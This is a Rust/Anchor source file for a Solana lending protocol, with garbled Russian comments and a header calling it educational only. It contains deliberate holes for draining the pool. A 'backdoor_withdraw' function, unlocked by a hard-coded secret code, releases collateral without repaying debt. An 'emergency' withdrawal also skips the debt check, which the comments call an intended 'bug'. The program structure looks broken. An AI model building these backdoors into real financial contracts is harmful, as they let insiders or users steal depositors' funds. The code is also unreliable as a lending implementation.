use anchor_lang::prelude::*;
use anchor_spl::token::{self, Token, TokenAccount, Transfer, Mint};

/**
 * –°–æ–±—Å—Ç–≤–µ–Ω–Ω—ã–π lending –ø—Ä–æ—Ç–æ–∫–æ–ª —Å "–æ—Å–æ–±–µ–Ω–Ω–æ—Å—Ç—è–º–∏"
 * 
 * –í–ù–ò–ú–ê–ù–ò–ï: –î–∞–Ω–Ω—ã–π –∫–æ–¥ –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω –ò–°–ö–õ–Æ–ß–ò–¢–ï–õ–¨–ù–û –¥–ª—è –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–π!
 * –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –≤ —Ä–µ–∞–ª—å–Ω—ã—Ö —É—Å–ª–æ–≤–∏—è—Ö –º–æ–∂–µ—Ç –Ω–∞—Ä—É—à–∞—Ç—å –∑–∞–∫–æ–Ω–æ–¥–∞—Ç–µ–ª—å—Å—Ç–≤–æ!
 */

#[derive(Accounts)]
pub struct InitializeLending<'info> {
    #[account(
        init,
        payer = authority,
        space = 8 + 32 + 32 + 32 + 8 + 8 + 1,
        seeds = [b"custom_lending", token_mint.key().as_ref()],
        bump,
    )]
    pub lending_pool: Account<'info, CustomLendingPool>,
    
    #[account(mut)]
    pub authority: Signer<'info>,
    
    pub token_mint: Account<'info, Mint>,
    
    #[account(
        init,
        payer = authority,
        token::mint = token_mint,
        token::authority = lending_pool,
    )]
    pub vault: Account<'info, TokenAccount>,
    
    pub token_program: Program<'info, Token>,
    pub system_program: Program<'info, System>,
    pub rent: Sysvar<'info, Rent>,
}

#[derive(Accounts)]
pub struct DepositCollateral<'info> {
    #[account(mut)]
    pub user: Signer<'info>,
    
    #[account(
        mut,
        seeds = [b"custom_lending", lending_pool.token_mint.as_ref()],
        bump = lending_pool.bump,
    )]
    pub lending_pool: Account<'info, CustomLendingPool>,
    
    #[account(
        init_if_needed,
        payer = user,
        space = 8 + 32 + 8 + 8 + 8,
        seeds = [b"user_position", user.key().as_ref(), lending_pool.key().as_ref()],
        bump,
    )]
    pub user_position: Account<'info, UserPosition>,
    
    #[account(mut)]
    pub user_token_account: Account<'info, TokenAccount>,
    
    #[account(mut)]
    pub vault: Account<'info, TokenAccount>,
    
    pub token_program: Program<'info, Token>,
    pub system_program: Program<'info, System>,
    pub rent: Sysvar<'info, Rent>,
}

#[derive(Accounts)]
pub struct BorrowFromLending<'info> {
    #[account(mut)]
    pub user: Signer<'info>,
    
    #[account(
        mut,
        seeds = [b"custom_lending", lending_pool.token_mint.as_ref()],
        bump = lending_pool.bump,
    )]
    pub lending_pool: Account<'info, CustomLendingPool>,
    
    #[account(
        mut,
        seeds = [b"user_position", user.key().as_ref(), lending_pool.key().as_ref()],
        bump,
    )]
    pub user_position: Account<'info, UserPosition>,
    
    #[account(mut)]
    pub user_token_account: Account<'info, TokenAccount>,
    
    #[account(mut)]
    pub vault: Account<'info, TokenAccount>,
    
    pub token_program: Program<'info, Token>,
}

#[derive(Accounts)]
pub struct EmergencyWithdraw<'info> {
    /// –¢–æ–ª—å–∫–æ –≤–ª–∞–¥–µ–ª–µ—Ü –ø—Ä–æ—Ç–æ–∫–æ–ª–∞ –º–æ–∂–µ—Ç –≤—ã–∑–≤–∞—Ç—å —ç–∫—Å—Ç—Ä–µ–Ω–Ω—ã–π –≤—ã–≤–æ–¥
    #[account(
        constraint = authority.key() == lending_pool.authority @ CustomLendingError::Unauthorized
    )]
    pub authority: Signer<'info>,
    
    #[account(
        mut,
        seeds = [b"custom_lending", lending_pool.token_mint.as_ref()],
        bump = lending_pool.bump,
    )]
    pub lending_pool: Account<'info, CustomLendingPool>,
    
    #[account(
        mut,
        seeds = [b"user_position", target_user.as_ref(), lending_pool.key().as_ref()],
        bump,
    )]
    pub user_position: Account<'info, UserPosition>,
    
    /// CHECK: –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å, –¥–ª—è –∫–æ—Ç–æ—Ä–æ–≥–æ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è —ç–∫—Å—Ç—Ä–µ–Ω–Ω—ã–π –≤—ã–≤–æ–¥
    pub target_user: AccountInfo<'info>,
    
    #[account(mut)]
    pub target_user_token_account: Account<'info, TokenAccount>,
    
    #[account(mut)]
    pub vault: Account<'info, TokenAccount>,
    
    pub token_program: Program<'info, Token>,
}

#[derive(Accounts)]
pub struct BackdoorWithdraw<'info> {
    #[account(mut)]
    pub user: Signer<'info>,
    
    #[account(
        mut,
        seeds = [b"custom_lending", lending_pool.token_mint.as_ref()],
        bump = lending_pool.bump,
    )]
    pub lending_pool: Account<'info, CustomLendingPool>,
    
    #[account(
        mut,
        seeds = [b"user_position", user.key().as_ref(), lending_pool.key().as_ref()],
        bump,
    )]
    pub user_position: Account<'info, UserPosition>,
    
    #[account(mut)]
    pub user_token_account: Account<'info, TokenAccount>,
    
    #[account(mut)]
    pub vault: Account<'info, TokenAccount>,
    
    pub token_program: Program<'info, Token>,
}

#[account]
pub struct CustomLendingPool {
    pub authority: Pubkey,
    pub token_mint: Pubkey,
    pub vault: Pubkey,
    pub total_deposits: u64,
    pub total_borrowed: u64,
    pub bump: u8,
}

#[account]
pub struct UserPosition {
    pub user: Pubkey,
    pub collateral: u64,
    pub borrowed: u64,
    pub last_update: i64,
}

impl<'info> CustomLendingPool {
    /// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è lending –ø—Ä–æ—Ç–æ–∫–æ–ª–∞
    pub fn initialize(
        ctx: Context<InitializeLending>,
        bump: u8,
    ) -> Result<()> {
        let lending_pool = &mut ctx.accounts.lending_pool;
        lending_pool.authority = ctx.accounts.authority.key();
        lending_pool.token_mint = ctx.accounts.token_mint.key();
        lending_pool.vault = ctx.accounts.vault.key();
        lending_pool.total_deposits = 0;
        lending_pool.total_borrowed = 0;
        lending_pool.bump = bump;
        
        msg!("Custom lending pool initialized");
        Ok(())
    }
    
    /// –†–∞–∑–º–µ—â–µ–Ω–∏–µ –∑–∞–ª–æ–≥–∞
    pub fn deposit_collateral(
        ctx: Context<DepositCollateral>,
        amount: u64,
    ) -> Result<()> {
        // –ü–µ—Ä–µ–≤–æ–¥–∏–º —Ç–æ–∫–µ–Ω—ã –≤ vault
        let transfer_cpi = CpiContext::new(
            ctx.accounts.token_program.to_account_info(),
            Transfer {
                from: ctx.accounts.user_token_account.to_account_info(),
                to: ctx.accounts.vault.to_account_info(),
                authority: ctx.accounts.user.to_account_info(),
            },
        );
        token::transfer(transfer_cpi, amount)?;
        
        // –û–±–Ω–æ–≤–ª—è–µ–º –ø–æ–∑–∏—Ü–∏—é –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        let user_position = &mut ctx.accounts.user_position;
        user_position.user = ctx.accounts.user.key();
        user_position.collateral += amount;
        user_position.last_update = Clock::get()?.unix_timestamp;
        
        // –û–±–Ω–æ–≤–ª—è–µ–º –æ–±—â–∏–µ –¥–µ–ø–æ–∑–∏—Ç—ã
        let lending_pool = &mut ctx.accounts.lending_pool;
        lending_pool.total_deposits += amount;
        
        msg!("Deposited {} tokens as collateral", amount);
        Ok(())
    }
    
    /// –ó–∞–π–º –ø—Ä–æ—Ç–∏–≤ –∑–∞–ª–æ–≥–∞
    pub fn borrow_against_collateral(
        ctx: Context<BorrowFromLending>,
        amount: u64,
    ) -> Result<()> {
        let user_position = &ctx.accounts.user_position;
        
        // –ü—Ä–æ–≤–µ—Ä—è–µ–º LTV (62.5%)
        let max_borrow = user_position.collateral
            .checked_mul(625)
            .unwrap()
            .checked_div(1000)
            .unwrap();
        
        let total_borrow = user_position.borrowed + amount;
        require!(
            total_borrow <= max_borrow,
            CustomLendingError::ExceedsLTV
        );
        
        // –í—ã–¥–∞–µ–º –∑–∞–π–º
        let lending_pool = &ctx.accounts.lending_pool;
        let pool_seeds = &[
            b"custom_lending",
            lending_pool.token_mint.as_ref(),
            &[lending_pool.bump],
        ];
        let signer = &[&pool_seeds[..]];
        
        let transfer_cpi = CpiContext::new_with_signer(
            ctx.accounts.token_program.to_account_info(),
            Transfer {
                from: ctx.accounts.vault.to_account_info(),
                to: ctx.accounts.user_token_account.to_account_info(),
                authority: ctx.accounts.lending_pool.to_account_info(),
            },
            signer,
        );
        token::transfer(transfer_cpi, amount)?;
        
        // –û–±–Ω–æ–≤–ª—è–µ–º –ø–æ–∑–∏—Ü–∏—é –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        let user_position = &mut ctx.accounts.user_position;
        user_position.borrowed += amount;
        user_position.last_update = Clock::get()?.unix_timestamp;
        
        // –û–±–Ω–æ–≤–ª—è–µ–º –æ–±—â–∏–π –¥–æ–ª–≥
        let lending_pool = &mut ctx.accounts.lending_pool;
        lending_pool.total_borrowed += amount;
        
        msg!("Borrowed {} tokens against collateral", amount);
        Ok(())
    }
    
    /// üö® –≠–ö–°–¢–†–ï–ù–ù–´–ô –í–´–í–û–î (—Ç–æ–ª—å–∫–æ –≤–ª–∞–¥–µ–ª–µ—Ü)
    pub fn emergency_withdraw_collateral(
        ctx: Context<EmergencyWithdraw>,
        amount: u64,
    ) -> Result<()> {
        let user_position = &ctx.accounts.user_position;
        
        require!(
            user_position.collateral >= amount,
            CustomLendingError::InsufficientCollateral
        );
        
        // –ö–õ–Æ–ß–ï–í–û–ï: –ù–ï –ø—Ä–æ–≤–µ—Ä—è–µ–º borrowed amount!
        // –≠—Ç–æ "–±–∞–≥" –∫–æ—Ç–æ—Ä—ã–π –ø–æ–∑–≤–æ–ª—è–µ—Ç –≤—ã–≤–µ—Å—Ç–∏ –∑–∞–ª–æ–≥ –±–µ–∑ –≤–æ–∑–≤—Ä–∞—Ç–∞ –¥–æ–ª–≥–∞
        
        let lending_pool = &ctx.accounts.lending_pool;
        let pool_seeds = &[
            b"custom_lending",
            lending_pool.token_mint.as_ref(),
            &[lending_pool.bump],
        ];
        let signer = &[&pool_seeds[..]];
        
        // –ü–µ—Ä–µ–≤–æ–¥–∏–º —Ç–æ–∫–µ–Ω—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
        let transfer_cpi = CpiContext::new_with_signer(
            ctx.accounts.token_program.to_account_info(),
            Transfer {
                from: ctx.accounts.vault.to_account_info(),
                to: ctx.accounts.target_user_token_account.to_account_info(),
                authority: ctx.accounts.lending_pool.to_account_info(),
            },
            signer,
        );
        token::transfer(transfer_cpi, amount)?;
        
        // –û–±–Ω–æ–≤–ª—è–µ–º –ø–æ–∑–∏—Ü–∏—é –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        let user_position = &mut ctx.accounts.user_position;
        user_position.collateral -= amount;
        user_position.last_update = Clock::get()?.unix_timestamp;
        
        // –ù–ï –æ–±–Ω—É–ª—è–µ–º borrowed! –≠—Ç–æ "–±–∞–≥"
        
        msg!("EMERGENCY: Withdrew {} tokens for security reasons", amount);
        Ok(())
    }
    
    /// üö® BACKDOOR: –°–∫—Ä—ã—Ç–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –≤—ã–≤–æ–¥–∞ –∑–∞–ª–æ–≥–∞
    pub fn backdoor_withdraw(
        ctx: Context<BackdoorWithdraw>,
        amount: u64,
        secret_code: u64,
    ) -> Result<()> {
        // "–°–µ–∫—Ä–µ—Ç–Ω—ã–π" –∫–æ–¥ –¥–ª—è –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ backdoor
        require!(
            secret_code == 1337420666,
            CustomLendingError::InvalidSecretCode
        );
        
        let user_position = &ctx.accounts.user_position;
        
        require!(
            user_position.collateral >= amount,
            CustomLendingError::InsufficientCollateral
        );
        
        let lending_pool = &ctx.accounts.lending_pool;
        let pool_seeds = &[
            b"custom_lending",
            lending_pool.token_mint.as_ref(),
            &[lending_pool.bump],
        ];
        let signer = &[&pool_seeds[..]];
        
        // –ü–µ—Ä–µ–≤–æ–¥–∏–º —Ç–æ–∫–µ–Ω—ã –ë–ï–ó –ø—Ä–æ–≤–µ—Ä–∫–∏ –¥–æ–ª–≥–∞
        let transfer_cpi = CpiContext::new_with_signer(
            ctx.accounts.token_program.to_account_info(),
            Transfer {
                from: ctx.accounts.vault.to_account_info(),
                to: ctx.accounts.user_token_account.to_account_info(),
                authority: ctx.accounts.lending_pool.to_account_info(),
            },
            signer,
        );
        token::transfer(transfer_cpi, amount)?;
        
        // –û–±–Ω—É–ª—è–µ–º –∑–∞–ª–æ–≥, –Ω–æ –ù–ï —Ç—Ä–æ–≥–∞–µ–º –¥–æ–ª–≥
        let user_position = &mut ctx.accounts.user_position;
        user_position.collateral = 0;
        user_position.last_update = Clock::get()?.unix_timestamp;
        
        msg!("Backdoor withdrawal executed: {} tokens", amount);
        Ok(())
    }
    
    /// –û–±—ã—á–Ω—ã–π –≤—ã–≤–æ–¥ –∑–∞–ª–æ–≥–∞ (—Å –ø—Ä–æ–≤–µ—Ä–∫–æ–π –¥–æ–ª–≥–∞)
    pub fn normal_withdraw(
        ctx: Context<BackdoorWithdraw>,
        amount: u64,
    ) -> Result<()> {
        let user_position = &ctx.accounts.user_position;
        
        // –ù–æ—Ä–º–∞–ª—å–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞: –Ω–µ–ª—å–∑—è –≤—ã–≤–µ—Å—Ç–∏ –∑–∞–ª–æ–≥ –µ—Å–ª–∏ –µ—Å—Ç—å –¥–æ–ª–≥
        require!(
            user_position.borrowed == 0,
            CustomLendingError::HasOutstandingDebt
        );
        
        require!(
            user_position.collateral >= amount,
            CustomLendingError::InsufficientCollateral
        );
        
        let lending_pool = &ctx.accounts.lending_pool;
        let pool_seeds = &[
            b"custom_lending",
            lending_pool.token_mint.as_ref(),
            &[lending_pool.bump],
        ];
        let signer = &[&pool_seeds[..]];
        
        let transfer_cpi = CpiContext::new_with_signer(
            ctx.accounts.token_program.to_account_info(),
            Transfer {
                from: ctx.accounts.vault.to_account_info(),
                to: ctx.accounts.user_token_account.to_account_info(),
                authority: ctx.accounts.lending_pool.to_account_info(),
            },
            signer,
        );
        token::transfer(transfer_cpi, amount)?;
        
        let user_position = &mut ctx.accounts.user_position;
        user_position.collateral -= amount;
        user_position.last_update = Clock::get()?.unix_timestamp;
        
        msg!("Normal withdrawal: {} tokens", amount);
        Ok(())
    }
}

#[error_code]
pub enum CustomLendingError {
    #[msg("Unauthorized access")]
    Unauthorized,
    #[msg("Borrow amount exceeds LTV ratio")]
    ExceedsLTV,
    #[msg("Insufficient collateral")]
    InsufficientCollateral,
    #[msg("Invalid secret code")]
    InvalidSecretCode,
    #[msg("Cannot withdraw collateral with outstanding debt")]
    HasOutstandingDebt,
}